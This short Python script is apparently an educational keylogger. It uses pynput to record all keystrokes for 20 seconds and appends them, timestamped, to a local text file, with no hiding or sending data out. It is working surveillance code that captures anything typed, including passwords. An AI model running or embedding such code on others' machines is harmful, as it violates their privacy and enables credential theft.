from pynput import keyboard
import time
from datetime import datetime

log_file = "key_log_intermediate.txt"
keys_buffer = []
start_time = time.time()
duration = 20  # seconds to run before stopping

# Save buffer to file
def save_to_file():
    with open(log_file, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
        f.write("".join(keys_buffer))
        f.write("\n")

# Handle key press
def on_press(key):
    try:
        keys_buffer.append(key.char)  # Normal key
    except AttributeError:
        keys_buffer.append(f"[{key.name}]")  # Special key like Enter, Space, etc.

    # Auto save every 10 characters
    if len(keys_buffer) >= 10:
        save_to_file()
        keys_buffer.clear()

    # Stop after duration
    if time.time() - start_time > duration:
        save_to_file()
        return False

# Start listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

print(f"✅ Keylogging finished. Check '{log_file}' for results.")
